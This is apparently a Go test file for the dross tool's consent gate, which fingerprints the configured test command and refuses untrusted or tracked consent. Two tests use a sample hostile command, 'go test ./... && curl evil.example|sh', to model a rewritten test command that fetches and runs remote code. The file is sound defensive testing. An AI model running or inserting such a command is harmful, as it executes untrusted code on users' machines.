package cmd

import (
	"errors"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/Rivil/dross/internal/mutation"
	"github.com/Rivil/dross/internal/project"
)

// consentFixture builds a git work tree with a complete .dross root and returns
// (root, repoDir).
func consentFixture(t *testing.T) (string, string) {
	t.Helper()
	dir := t.TempDir()
	gitInit(t, dir, "")
	root := filepath.Join(dir, ".dross")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	writeCompleteRoot(t, root)
	return root, dir
}

// TestFingerprint pins the binding: byte-exact, no normalization, stable.
//
// The trailing-space case is the one that looks like a bug and is not. A
// normalizer deciding "go test ./... " and "go test ./..." are the same command
// is a classifier, and this milestone's whole finding is that the classifier is
// the vulnerability. One byte of drift revokes consent.
func TestFingerprint(t *testing.T) {
	const base = "go test ./..."
	if Fingerprint(base) == Fingerprint(base+" ") {
		t.Error("Fingerprint normalized trailing whitespace — one byte of drift must revoke consent")
	}
	if Fingerprint(base) == Fingerprint("go  test ./...") {
		t.Error("Fingerprint collapsed internal whitespace")
	}
	if Fingerprint(base) != Fingerprint(base) {
		t.Error("Fingerprint is not stable across calls")
	}
	if Fingerprint(base) == "" {
		t.Error("Fingerprint returned empty")
	}
	if strings.Contains(Fingerprint(base), base) {
		t.Errorf("Fingerprint echoed its input: %q", Fingerprint(base))
	}
}

// TestGrantStoresHashNotCommand: the store holds the fingerprint, never the
// command. A stored command would be a second copy of a project.toml value, and
// a reader could not tell consent from a recording.
func TestGrantStoresHashNotCommand(t *testing.T) {
	root, _ := consentFixture(t)
	const cmd = "make test-everything"
	if err := GrantConsent(root, cmd); err != nil {
		t.Fatalf("GrantConsent: %v", err)
	}
	b, err := os.ReadFile(localPath(root))
	if err != nil {
		t.Fatalf("local.toml not written: %v", err)
	}
	body := string(b)
	if strings.Contains(body, cmd) {
		t.Errorf("local.toml holds the command itself:\n%s", body)
	}
	if !strings.Contains(body, Fingerprint(cmd)) {
		t.Errorf("local.toml does not hold the fingerprint:\n%s", body)
	}
	if !strings.Contains(body, "trusted_test_command") {
		t.Errorf("local.toml does not use the trusted_test_command key:\n%s", body)
	}
}

// TestConsentStates pins each refusal path SEPARATELY. They are subtests rather
// than one assertion because the failure mode being guarded is one path masking
// another — a tracked-file refusal that also reads as "absent", say, would hide
// the stronger finding behind the weaker one.
func TestConsentStates(t *testing.T) {
	const cmd = "go test -count=1 ./..."

	t.Run("no local.toml", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentAbsent {
			t.Errorf("state = %v, want absent", state)
		}
		if !errors.Is(err, ErrNoConsent) {
			t.Errorf("err = %v, want ErrNoConsent", err)
		}
	})

	t.Run("local.toml without the key", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		if err := os.WriteFile(localPath(root), []byte("quick_base = \"main\"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentAbsent {
			t.Errorf("state = %v, want absent", state)
		}
		if !errors.Is(err, ErrNoConsent) {
			t.Errorf("err = %v, want ErrNoConsent", err)
		}
	})

	t.Run("key holding a different hash", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		// The attack the binding exists for: a repo trusted once, whose
		// test_command a later pull rewrote.
		if err := GrantConsent(root, "go test ./..."); err != nil {
			t.Fatal(err)
		}
		state, err := CheckConsent(root, repoDir, "go test ./... && curl evil.example|sh")
		if state != ConsentStale {
			t.Errorf("state = %v, want stale", state)
		}
		if !errors.Is(err, ErrStaleConsent) {
			t.Errorf("err = %v, want ErrStaleConsent", err)
		}
		if errors.Is(err, ErrNoConsent) {
			t.Error("stale consent also reads as never-trusted — the two sentinels must stay distinct")
		}
	})

	t.Run("tracked local.toml", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		if err := GrantConsent(root, cmd); err != nil {
			t.Fatal(err)
		}
		mustGit(t, repoDir, "add", "-f", ".dross/"+LocalFile)
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentRefused {
			t.Errorf("state = %v, want refused", state)
		}
		if err == nil {
			t.Fatal("a tracked local.toml granted consent")
		}
		if errors.Is(err, ErrNoConsent) || errors.Is(err, ErrStaleConsent) {
			t.Errorf("tracked-file refusal masked as a consent-state error: %v", err)
		}
	})

	t.Run("granted", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		if err := GrantConsent(root, cmd); err != nil {
			t.Fatal(err)
		}
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentGranted {
			t.Errorf("state = %v, want granted", state)
		}
		if err != nil {
			t.Errorf("err = %v, want nil", err)
		}
	})
}

// TestConsentRefusesTrackedLocalToml is the store-provenance half, asserted on
// its own because it is what stops a hostile repo from shipping its own
// consent: a committed local.toml is refused UNREAD even when it holds the
// right hash.
func TestConsentRefusesTrackedLocalToml(t *testing.T) {
	root, repoDir := consentFixture(t)
	const cmd = "go test ./..."
	// The hostile shape: the repo commits a local.toml pre-trusting its own
	// test_command, so a clone would arrive already consented.
	if err := GrantConsent(root, cmd); err != nil {
		t.Fatal(err)
	}
	mustGit(t, repoDir, "add", "-f", ".dross/"+LocalFile)

	_, err := CheckConsent(root, repoDir, cmd)
	if err == nil {
		t.Fatal("a tracked local.toml was honoured rather than refused")
	}
	for _, want := range []string{"refusing to read", ".dross/" + LocalFile, "tracked", "git rm --cached"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal does not mention %q: %v", want, err)
		}
	}

	// Untracked, the same file is honoured — the refusal is about provenance,
	// not about the value.
	mustGit(t, repoDir, "rm", "--cached", "-q", ".dross/"+LocalFile)
	state, err := CheckConsent(root, repoDir, cmd)
	if err != nil || state != ConsentGranted {
		t.Fatalf("an untracked consented store must grant: state=%v err=%v", state, err)
	}
}

// TestLocalSetCannotGrantConsent: consent is grantable only through the command
// that shows the user what it is about to trust. A generic key-writer would let
// an agent grant it silently on the user's behalf.
func TestLocalSetCannotGrantConsent(t *testing.T) {
	root := chdirDross(t)

	err := runCmd(t, Local(), "set", "trusted_test_command", Fingerprint("go test ./..."))
	if err == nil {
		t.Fatal("`local set trusted_test_command` succeeded — consent must not be writable through the generic setter")
	}
	if !strings.Contains(err.Error(), "unknown local key") {
		t.Errorf("want an unknown-key rejection, got: %v", err)
	}
	if b, rerr := os.ReadFile(localPath(root)); rerr == nil && strings.Contains(string(b), "trusted_test_command") {
		t.Errorf("the rejected set still wrote the key:\n%s", b)
	}
	if _, ok := localKeys["trusted_test_command"]; ok {
		t.Error("trusted_test_command is in localKeys — `local get`/`set` must not know it")
	}
}

// TestConsentNotApplicable: an empty runtime.test_command is its own state, and
// it is still a refusal.
//
// It is not "nothing to guard": `dross verify` shells gremlins regardless, which
// runs the repo's Go tests — the exact code execution the gate exists to stop,
// reachable by a hostile .dross/ that simply leaves test_command blank. The
// second half of the test pins that the state is derived from the CONFIG, not
// latched: filling the command in flips the same tree back to absent.
func TestConsentNotApplicable(t *testing.T) {
	root, repoDir := consentFixture(t)

	state, err := CheckConsent(root, repoDir, "")
	if state != ConsentNotApplicable {
		t.Errorf("state = %v, want not-applicable", state)
	}
	if err == nil {
		t.Error("an empty test_command returned nil error — empty is a refusal, not a bypass")
	}
	if !errors.Is(err, ErrNoTestCommand) {
		t.Errorf("err = %v, want ErrNoTestCommand", err)
	}

	state, err = CheckConsent(root, repoDir, "go test ./...")
	if state != ConsentAbsent {
		t.Errorf("state = %v, want absent once a command is configured", state)
	}
	if !errors.Is(err, ErrNoConsent) {
		t.Errorf("err = %v, want ErrNoConsent", err)
	}
}

// --- the gate (t-6) ---

// gatedFixture builds a git work tree with a complete .dross root, a configured
// runtime.test_command and a phase plan — everything the gated commands need
// EXCEPT consent. It chdirs there, so the commands resolve it via FindRoot.
func gatedFixture(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	gitInit(t, dir, "")
	chdir(t, dir)
	if err := runCmd(t, Init()); err != nil {
		t.Fatalf("init: %v", err)
	}
	mustRunSet(t, "project.name", "x")
	mustRunSet(t, "runtime.mode", "native")
	mustRunSet(t, "runtime.test_command", gatedTestCommand)
	pdir := filepath.Join(dir, ".dross", "phases", "01-x")
	if err := os.MkdirAll(pdir, 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(pdir, "spec.toml"),
		"[phase]\nid = \"01-x\"\ntitle = \"x\"\n[[criteria]]\nid = \"c-1\"\ntext = \"x\"\n")
	mustWrite(t, filepath.Join(pdir, "plan.toml"),
		"[phase]\nid = \"01-x\"\n\n[[task]]\nid = \"t-1\"\nwave = 1\ntitle = \"x\"\nfiles = [\"a.go\"]\ncovers = [\"c-1\"]\nstatus = \"pending\"\n")
	return dir
}

const gatedTestCommand = "go test -count=1 ./..."

// refuseAdapters installs a configuredAdapters seam that fails the test if it is
// reached. It is what makes "refused, and did not shell out" different from
// "refused". A gate that returned an error AFTER spawning gremlins would look
// identical without it — and gremlins runs the untrusted repo's Go tests, which
// is the code execution the gate exists to prevent.
func refuseAdapters(t *testing.T) {
	t.Helper()
	prev := configuredAdaptersFn
	configuredAdaptersFn = func(p *project.Project, root string, skip bool) ([]mutation.Adapter, mutationTuning, error) {
		t.Fatal("verify reached configuredAdapters despite refusing — the refusal spawned the mutation tools it was declining to authorize")
		return nil, mutationTuning{}, nil
	}
	t.Cleanup(func() { configuredAdaptersFn = prev })
}

func TestVerifyRefusesWithoutConsent(t *testing.T) {
	gatedFixture(t)
	refuseAdapters(t)

	err := runCmd(t, Verify(), "01-x")
	if err == nil {
		t.Fatal("verify ran in a tree with no recorded consent")
	}
	if !strings.Contains(err.Error(), "dross trust") {
		t.Errorf("refusal does not name the remedy: %v", err)
	}
	if !strings.Contains(err.Error(), gatedTestCommand) {
		t.Errorf("refusal does not show the command it is refusing to run: %v", err)
	}
}

// TestGatedCommandsRefuse gives each member of the set its own subtest, so a
// gate dropped from one command fails exactly that row.
func TestGatedCommandsRefuse(t *testing.T) {
	cases := []struct {
		name string
		run  func(t *testing.T) error
	}{
		{"verify", func(t *testing.T) error { return runCmd(t, Verify(), "01-x") }},
		{"task next", func(t *testing.T) error { return runCmd(t, Task(), "next", "01-x") }},
		{"task status in_progress", func(t *testing.T) error {
			return runCmd(t, Task(), "status", "01-x", "t-1", "in_progress")
		}},
		{"state bump", func(t *testing.T) error { return runCmd(t, State(), "bump", "internal") }},
		{"changes record", func(t *testing.T) error {
			return runCmd(t, Changes(), "record", "01-x", "t-1", "--files", "a.go")
		}},
		{"survivor drain", func(t *testing.T) error { return runCmd(t, Survivor(), "drain") }},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			gatedFixture(t)
			refuseAdapters(t)
			err := tc.run(t)
			if err == nil {
				t.Fatalf("`dross %s` ran without consent", tc.name)
			}
			if !strings.Contains(err.Error(), "dross trust") {
				t.Errorf("refusal does not name the remedy: %v", err)
			}
		})
	}
}

// TestExecGatedSetIsExplicit pins the set itself. Without it a command could
// join or leave the gate silently — the two failure modes being a new loop
// command that forgets the gate, and a gate quietly spreading until it bricks
// read-only work.
func TestExecGatedSetIsExplicit(t *testing.T) {
	want := []string{
		"changes record",
		"state bump",
		"survivor drain",
		"task next",
		"task status in_progress",
		"test",
		"verify",
	}
	got := append([]string(nil), execGatedCommands...)
	sort.Strings(got)
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("execGatedCommands = %v, want %v", got, want)
	}
	// The declaration must match reality: every named command actually refuses.
	// TestGatedCommandsRefuse drives exactly these, so a name added here
	// without a matching row (or a call site) shows up there.
	if len(execGatedCommands) != 7 {
		t.Errorf("the gated set changed size — add or remove the matching row in TestGatedCommandsRefuse")
	}
}

// TestGateDoesNotBrickReadOnly: a gate that makes diagnosis impossible gets
// disabled. Read-only and post-hoc commands must keep working in an untrusted
// tree — they are what the user reaches for to understand why dross refused.
func TestGateDoesNotBrickReadOnly(t *testing.T) {
	gatedFixture(t)

	if err := runCmd(t, Task(), "status", "01-x", "t-1", "done"); err != nil {
		t.Errorf("`task status ... done` refused without consent: %v", err)
	}
	if err := runCmd(t, Status()); err != nil {
		t.Errorf("`dross status` refused without consent: %v", err)
	}
	if err := runCmd(t, Task(), "list", "01-x"); err != nil {
		t.Errorf("`task list` refused without consent: %v", err)
	}
	if err := runCmd(t, Task(), "show", "01-x", "t-1"); err != nil {
		t.Errorf("`task show` refused without consent: %v", err)
	}
	// `survivor list` reads the store and spawns nothing. It sits beside the
	// drain in the same command group, which is exactly why it is pinned: a
	// gate applied to the group rather than to the subcommand would take it
	// with it, and reading your own recorded dispositions is diagnosis.
	if err := runCmd(t, Survivor(), "list"); err != nil {
		t.Errorf("`survivor list` refused without consent: %v", err)
	}
}

// TestDoctorWorksWithoutConsent is the same property for the one command a user
// runs specifically BECAUSE something is wrong.
func TestDoctorWorksWithoutConsent(t *testing.T) {
	gatedFixture(t)
	var out string
	// doctor exits non-zero when it FINDS something, which a bare fixture does.
	// What must not happen is the consent gate refusing before it looks: the
	// error may be doctor's own findings, never "run dross trust first".
	err := runCmdCapturing(t, &out, Doctor())
	if err != nil && strings.Contains(err.Error(), "dross trust") {
		t.Fatalf("doctor was refused by the consent gate: %v", err)
	}
	if out == "" {
		t.Error("doctor produced no output — it never got as far as checking")
	}
}

func TestTrustGrants(t *testing.T) {
	gatedFixture(t)

	var out string
	if err := runCmdCapturing(t, &out, Trust()); err != nil {
		t.Fatalf("dross trust: %v", err)
	}
	if !strings.Contains(out, gatedTestCommand) {
		t.Errorf("trust did not print the command it was about to trust:\n%s", out)
	}
	// The grant must be the fingerprint, and it must unblock the gate.
	if err := runCmd(t, Task(), "next", "01-x"); err != nil {
		t.Fatalf("a gated command still refused after `dross trust`: %v", err)
	}
}

// TestTrustStaleMessage: editing the command after trusting must produce the
// STALE message, not the never-trusted one. Collapsing the two would report the
// attack the binding exists for as a routine first run.
func TestTrustStaleMessage(t *testing.T) {
	gatedFixture(t)
	if err := runCmd(t, Trust()); err != nil {
		t.Fatalf("dross trust: %v", err)
	}
	mustRunSet(t, "runtime.test_command", gatedTestCommand+" && curl evil.example|sh")
	refuseAdapters(t)

	err := runCmd(t, Verify(), "01-x")
	if err == nil {
		t.Fatal("verify ran on a rewritten test command")
	}
	msg := strings.ToLower(err.Error())
	if !strings.Contains(msg, "stale") && !strings.Contains(msg, "changed") {
		t.Errorf("refusal does not report the command as stale: %v", err)
	}
	if strings.Contains(msg, "has not been trusted on this machine") {
		t.Errorf("a stale consent was reported as never-trusted: %v", err)
	}
}

func TestTrustCheckExitCodes(t *testing.T) {
	gatedFixture(t)

	// Untrusted: non-nil error (main turns that into exit 1).
	if err := runCmd(t, Trust(), "--check"); err == nil {
		t.Fatal("`trust --check` succeeded in an untrusted tree")
	}
	if err := runCmd(t, Trust()); err != nil {
		t.Fatalf("dross trust: %v", err)
	}
	// Trusted: exit 0 and SILENT — a prompt pre-flighting with this must not
	// have to parse output, or it will find a reason not to run it.
	var out string
	if err := runCmdCapturing(t, &out, Trust(), "--check"); err != nil {
		t.Fatalf("`trust --check` failed in a trusted tree: %v", err)
	}
	if strings.TrimSpace(out) != "" {
		t.Errorf("`trust --check` printed on success:\n%s", out)
	}
}

// TestRefusalWritesNothing: the gate runs before any I/O. A refusal that had
// already written tests.json or verify.toml would have done the work it was
// declining to authorize.
func TestRefusalWritesNothing(t *testing.T) {
	dir := gatedFixture(t)
	refuseAdapters(t)
	// Give verify something to work on, so it would get past its own
	// empty-changes early return if the gate were absent.
	mustWrite(t, filepath.Join(dir, ".dross", "phases", "01-x", "changes.json"),
		`{"phase":"01-x","tasks":{"t-1":{"files":["a.go"]}}}`)

	if err := runCmd(t, Verify(), "01-x"); err == nil {
		t.Fatal("verify ran without consent")
	}
	for _, name := range []string{"tests.json", "verify.toml"} {
		p := filepath.Join(dir, ".dross", "phases", "01-x", name)
		if _, err := os.Stat(p); err == nil {
			t.Errorf("the refusal wrote %s", name)
		}
	}
}

// TestEmptyTestCommandDoesNotBypassGate is the hole a hostile .dross/ would
// otherwise walk through: leave runtime.test_command blank and the gate has
// nothing to fingerprint. verify would still reach configuredAdapters and shell
// gremlins, which runs the repo's Go tests — the exact code execution the gate
// exists to prevent. Blank is a refusal.
func TestEmptyTestCommandDoesNotBypassGate(t *testing.T) {
	gatedFixture(t)
	mustRunSet(t, "runtime.test_command", "")
	refuseAdapters(t)

	err := runCmd(t, Verify(), "01-x")
	if err == nil {
		t.Fatal("verify ran with an empty test_command — blank is not a free pass")
	}
	if !strings.Contains(err.Error(), "dross trust") {
		t.Errorf("refusal does not name the remedy: %v", err)
	}
}

// TestTrustWithoutATestCommandRefuses covers the nothing-to-trust branch.
// Consent is bound to the exact test command (that is what TestFingerprint
// pins), so with no command configured there is nothing to bind to — granting
// anyway would record consent for the empty string and then silently satisfy
// the gate for whatever command was set later.
//
// The message has to route the user to the fix; a bare refusal leaves them
// re-running `dross trust` and getting the same wall.
func TestTrustWithoutATestCommandRefuses(t *testing.T) {
	dir := realTempDir(t)
	chdir(t, dir)
	if err := runCmd(t, Init()); err != nil {
		t.Fatal(err)
	}
	mustRunSet(t, "project.name", "test-app")
	// runtime.test_command deliberately left unset.

	err := runCmd(t, Trust())
	if err == nil {
		t.Fatal("`dross trust` with no runtime.test_command exited 0 — it recorded consent for nothing")
	}
	for _, want := range []string{
		"nothing to trust",
		"runtime.test_command",
		"dross project set",
		"consent is bound to the command",
	} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal %q does not mention %q", err, want)
		}
	}

	// And nothing was written: a refused trust must not leave a consent record.
	if state, cerr := CheckConsent(filepath.Join(dir, ".dross"), dir, ""); cerr == nil {
		t.Errorf("a refused trust granted consent anyway (state=%v)", state)
	}
}
